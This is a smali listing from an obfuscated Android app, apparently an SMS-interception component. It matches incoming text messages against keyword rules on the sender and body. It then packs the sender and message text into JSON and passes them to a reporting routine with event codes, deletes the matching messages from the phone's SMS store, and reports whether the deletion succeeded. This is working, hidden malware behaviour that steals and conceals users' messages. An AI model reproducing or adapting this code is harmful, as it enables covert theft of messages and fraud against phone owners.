.class public final Lcom/boJUF/mB/mB/pO/JO/tP/uI;
.super Lcom/boJUF/mB/mB/pO/tP/uI;


# instance fields
.field IL:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

.field private Lx:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Lcom/boJUF/mB/mB/pO/tP/uI;-><init>()V

    iput-object p1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->Lx:Landroid/content/Context;

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    if-nez v0, :cond_0

    invoke-static {p1}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Landroid/content/Context;)Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    :cond_0
    return-void
.end method

.method private LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    .locals 5

    if-nez p2, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_0
    invoke-static {}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->On()V

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    iget-object v2, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    iget-wide v3, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->cp(Ljava/lang/String;Ljava/lang/String;J)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    const/4 v1, 0x1

    invoke-virtual {v0, p1, v1}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;I)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v2

    const/4 v3, 0x0

    const/4 v4, 0x1

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Ljava/lang/String;III)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/JO/mB/uI;

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    iget-object v2, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    iget-wide v3, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/boJUF/mB/mB/pO/JO/mB/uI;->LA(Ljava/lang/String;Ljava/lang/String;J)Z

    invoke-static {p2}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->TP(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    const-string v2, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v2, "text"

    invoke-virtual {v1, v2, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v0, 0xce8

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->Lx:Landroid/content/Context;

    invoke-static {v0, v1, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z

    invoke-virtual {p0, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->cp(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "1"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xce9

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->Lx:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    :cond_2
    :try_start_1
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "SOID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->LA()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "TID"

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/ji;->cp()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "flag"

    const-string v2, "0"

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v1, 0xce9

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->Lx:Landroid/content/Context;

    invoke-static {v1, v0, v2}, Lcom/boJUF/mB/mB/pO/tP/tQ;->LA(ILjava/util/HashMap;Landroid/content/Context;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method public static TP(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/String;
    .locals 3

    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "cp"

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "content"

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, ""

    goto :goto_0
.end method


# virtual methods
.method public final LA(Lcom/boJUF/mB/mB/pO/mB/XQ;Ljava/util/List;)V
    .locals 6

    if-nez p1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    if-eqz p2, :cond_0

    :try_start_0
    invoke-interface {p2}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-interface {p2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_2
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/boJUF/mB/mB/pO/mB/ji;

    new-instance v2, Lorg/json/JSONObject;

    invoke-virtual {v0}, Lcom/boJUF/mB/mB/pO/mB/ji;->na()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object v2

    if-eqz v2, :cond_2

    :cond_3
    :goto_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, ","

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_4

    const-string v4, ","

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    iget-object v4, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v5, 0x0

    aget-object v5, v3, v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_3

    iget-object v4, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v5, 0x1

    aget-object v3, v3, v5

    invoke-virtual {v4, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    iget-object v3, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v0}, Lcom/boJUF/mB/mB/pO/mB/ji;->TP()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-direct {p0, v0, p1}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :cond_4
    :try_start_1
    const-string v4, "\uff0c"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_5

    const-string v4, "\uff0c"

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    iget-object v4, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v5, 0x0

    aget-object v5, v3, v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_3

    iget-object v4, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v5, 0x1

    aget-object v3, v3, v5

    invoke-virtual {v4, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    iget-object v3, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v0}, Lcom/boJUF/mB/mB/pO/mB/ji;->TP()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-direct {p0, v0, p1}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V

    goto :goto_1

    :cond_5
    iget-object v4, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {v4, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    iget-object v3, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v0}, Lcom/boJUF/mB/mB/pO/mB/ji;->TP()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-direct {p0, v0, p1}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1
.end method

.method public final declared-synchronized On(Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    .locals 2

    monitor-enter p0

    :try_start_0
    invoke-static {}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->On()V

    invoke-virtual {p0, p1}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->LA(Lcom/boJUF/mB/mB/pO/mB/XQ;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    monitor-exit p0

    return-void

    :cond_1
    :try_start_1
    sget-boolean v0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->na:Z

    if-nez v0, :cond_0

    sget-boolean v0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->oC:Z

    if-nez v0, :cond_0

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->LA:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    invoke-virtual {p0}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->cp()V

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->TP:Landroid/os/Handler;

    new-instance v1, Lcom/boJUF/mB/mB/pO/JO/tP/oC;

    invoke-direct {v1, p0, p1}, Lcom/boJUF/mB/mB/pO/JO/tP/oC;-><init>(Lcom/boJUF/mB/mB/pO/JO/tP/uI;Lcom/boJUF/mB/mB/pO/mB/XQ;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    monitor-exit p0

    throw v0
.end method

.method public final cp(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/Boolean;
    .locals 8

    const/4 v0, 0x1

    const/4 v1, 0x0

    :try_start_0
    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->Lx:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "content://sms"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    const-string v4, "body =? and address=?"

    const/4 v5, 0x2

    new-array v5, v5, [Ljava/lang/String;

    const/4 v6, 0x0

    iget-object v7, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aput-object v7, v5, v6

    const/4 v6, 0x1

    iget-object v7, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4, v5}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    int-to-long v2, v2

    const-wide/16 v4, 0x0

    cmp-long v2, v2, v4

    if-lez v2, :cond_0

    :goto_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0

    :cond_0
    move v0, v1

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    move v0, v1

    goto :goto_0
.end method
